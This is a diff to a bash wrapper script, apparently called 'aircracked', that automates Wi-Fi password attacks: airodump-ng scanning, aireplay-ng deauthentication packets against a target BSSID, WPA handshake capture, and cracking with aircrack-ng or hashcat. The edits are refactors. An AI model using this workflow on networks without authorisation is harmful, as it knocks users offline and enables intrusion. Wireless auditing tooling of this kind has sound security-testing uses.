@@ -16,6 +16,7 @@ TARGET_BSSID=""
 TARGET_CHANNEL=""
 TARGET_CLIENT=""
 CAPTURE_FILE=""
+HASHCAT_AVAILABLE=1
 
 # Args
 SHOW_HIDDEN=0
@@ -61,11 +62,13 @@ check_dependencies() {
   fi
 
   if ! command -v hashcat &>/dev/null; then
-    warnings+=("hashcat is not installed — hashcat cracking will not work. Install with: sudo apt install hashcat")
+    warnings+=("hashcat is not installed — hashcat cracking will not work.")
+    HASHCAT_AVAILABLE=0
   fi
 
   if ! command -v hcxpcapngtool &>/dev/null; then
-    warnings+=("hcxtools is not installed — hashcat cracking will not work. Install with: sudo apt install hcxtools")
+    warnings+=("hcxtools is not installed — hashcat cracking will not work.")
+    HASHCAT_AVAILABLE=0
   fi
 
   if [[ ${#warnings[@]} -gt 0 ]]; then
@@ -280,9 +283,7 @@ detect_terminal() {
 # ─────────────────────────────────────────
 launch_in_terminal() {
   local cmd="$1"
-  local flag
-  flag=$(mktemp /tmp/aircracked_done_XXXX)
-  rm -f "$flag" # Remove so we can watch for its creation
+  local flag="$2"
 
   local wrapped="$cmd; touch '$flag'"
 
@@ -293,11 +294,7 @@ launch_in_terminal() {
   foot) "$TERMINAL" bash -c "$wrapped" & ;;
   *) "$TERMINAL" -e "bash -c \"$wrapped\"" & ;;
   esac
-
-  # Return the flag path so the caller can wait on it
-  echo "$flag"
 }
-
 wait_for_terminal() {
   local flag="$1"
   local message="${2:-Waiting for window to close...}"
@@ -335,7 +332,9 @@ stage_scan() {
   SCAN_OUTPUT=$(mktemp /tmp/airodump_scan_XXXX.csv)
 
   local flag
-  flag=$(launch_in_terminal "sudo airodump-ng --output-format csv -w ${SCAN_OUTPUT%.csv} '$INTERFACE'")
+  flag=$(mktemp /tmp/aircracked_done_XXXX)
+  rm -f "$flag"
+  launch_in_terminal "sudo airodump-ng --output-format csv -w ${SCAN_OUTPUT%.csv} '$INTERFACE'" "$flag"
   wait_for_terminal "$flag" "Scan window launched. Close it when you've found your target."
 
   # airodump appends -01 to the filename
@@ -474,8 +473,11 @@ stage_capture() {
     confirm "Send deauth to $TARGET_BSSID now?" || bail "Aborted."
 
     local flag
-    flag=$(launch_in_terminal "sudo aireplay-ng -0 '$PACKET_COUNT' -a '$TARGET_BSSID' '$INTERFACE'")
-    wait_for_terminal "$flag" "Sending deauth packets, waiting for window to close..."
+    flag=$(mktemp /tmp/aircracked_done_XXXX)
+    rm -f "$flag"
+    launch_in_terminal "sudo aireplay-ng -0 '$PACKET_COUNT' -a '$TARGET_BSSID' '$INTERFACE'" "$flag"
+    echo -e "\n  ${YELLOW}[*] Sending deauth packets, waiting for window to close...${NC}"
+    wait_for_terminal "$flag"
   fi
 
   # Confirm handshake
@@ -500,7 +502,9 @@ stage_choose_cracker() {
 
   echo -e "  How would you like to crack the handshake?\n"
   echo -e "    ${BOLD}[1]${NC} aircrack-ng  (CPU, simple)"
-  echo -e "    ${BOLD}[2]${NC} hashcat      (GPU accelerated)"
+  if [[ "$HASHCAT_AVAILABLE" -eq 1 ]]; then
+    echo -e "    ${BOLD}[2]${NC} hashcat      (GPU accelerated)"
+  fi
   echo -e "    ${BOLD}[q]${NC} Quit\n"
 
   while true; do
@@ -514,15 +518,18 @@ stage_choose_cracker() {
       return
       ;;
     2)
-      CRACKER="hashcat"
-      advance_stage
-      return
+      if [[ "$HASHCAT_AVAILABLE" -eq 1 ]]; then
+        CRACKER="hashcat"
+        advance_stage
+        return
+      fi
+      echo -e "  ${RED}[!] hashcat is not available. Install hashcat and hcxtools to use this option.${NC}"
       ;;
     q)
       echo -e "\n  Goodbye.\n"
       exit 0
       ;;
-    *) echo -e "  ${RED}[!] Invalid selection. Enter 1, 2, or 'q'.${NC}" ;;
+    *) echo -e "  ${RED}[!] Invalid selection.${NC}" ;;
     esac
   done
 }
@@ -548,7 +555,7 @@ stage_crack_aircrack() {
   local log="$HOME/.aircracked/aircrack_$$.log"
 
   echo -ne "  ${YELLOW}[*] Cracking in progress...${NC}"
-  sudo aircrack-ng -b "$TARGET_BSSID" -w "$WORDLIST" "$CAPTURE_FILE-01.cap" >"$log" 2>&1 &
+  sudo aircrack-ng -q -b "$TARGET_BSSID" -w "$WORDLIST" "$CAPTURE_FILE-01.cap" >"$log" 2>&1 &
   local pid=$!
   while kill -0 $pid 2>/dev/null; do
     for s in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
@@ -558,11 +565,8 @@ stage_crack_aircrack() {
   done
   echo -ne "\r  ${YELLOW}[*] Cracking complete.        ${NC}\n"
 
-  sudo aircrack-ng -b "$TARGET_BSSID" -w "$WORDLIST" "$CAPTURE_FILE-01.cap" >"$log" 2>&1
-
   CRACKED_PASSWORD=$(grep -oP '(?<=KEY FOUND! \[ ).*(?= \])' "$log" 2>/dev/null | head -1)
   sudo rm -f "$log"
-
   advance_stage
 }
 
